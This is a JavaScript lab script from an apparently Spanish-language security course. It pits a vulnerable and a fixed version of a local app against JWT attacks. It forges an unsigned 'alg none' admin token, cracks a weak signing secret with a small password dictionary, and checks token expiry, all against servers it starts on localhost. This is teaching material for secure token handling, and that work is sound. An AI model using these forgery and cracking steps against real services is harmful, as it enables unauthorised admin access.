// Módulo 20 · F124 · El ataque: un cliente normal se fabrica un token de administrador sin conocer ninguna clave.
// Arranca las dos versiones en puertos libres y les envía lo mismo. Ejecuta: node f124-jwt/ataque.js
import { once } from 'node:events';
import jwt from 'jsonwebtoken';
import { crearApp as crearAntes } from './antes.js';
import { crearApp as crearDespues } from './despues.js';

const b64 = (objeto) => Buffer.from(JSON.stringify(objeto)).toString('base64url');
// Token «a mano»: cabecera con alg none, payload con rol admin y firma vacía.
const falsificado = `${b64({ alg: 'none', typ: 'JWT' })}.${b64({ sub: 'u1', rol: 'admin' })}.`;
// Segundo intento: firmado con el secreto débil, que sale de un diccionario en segundos.
const DICCIONARIO = ['123456', 'password', 'admin', 'secreto', 'qwerty'];

async function atacar(nombre, crearApp) {
  const servidor = crearApp().listen(0);
  await once(servidor, 'listening');
  const base = `http://127.0.0.1:${servidor.address().port}`;
  const pedir = (token) => fetch(`${base}/admin/ventas`, { headers: { authorization: `Bearer ${token}` } }).then(async (r) => `${r.status} ${JSON.stringify(await r.json())}`);
  const login = await fetch(`${base}/login`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ usuario: 'ana', clave: 'ana123' }) }).then((r) => r.json());
  console.log(`== ${nombre}`);
  console.log(`   token legítimo de Ana (rol cliente)  -> ${await pedir(login.token)}`);
  console.log(`   token falsificado (alg none, admin)  -> ${await pedir(falsificado)}`);
  const secreto = DICCIONARIO.find((palabra) => { try { jwt.verify(login.token, palabra); return true; } catch { return false; } });
  console.log(`   secreto por diccionario              -> ${secreto ? `encontrado: "${secreto}"` : 'no aplica: el token está firmado con ES256 (no hay secreto compartido)'}`);
  const { exp } = jwt.decode(login.token);
  console.log(`   caducidad del token                  -> ${exp ? `${exp - jwt.decode(login.token).iat} s` : 'ninguna: vale para siempre'}`);
  servidor.close();
}
await atacar('ANTES (vulnerable)', crearAntes);
await atacar('DESPUÉS (seguro)', crearDespues);
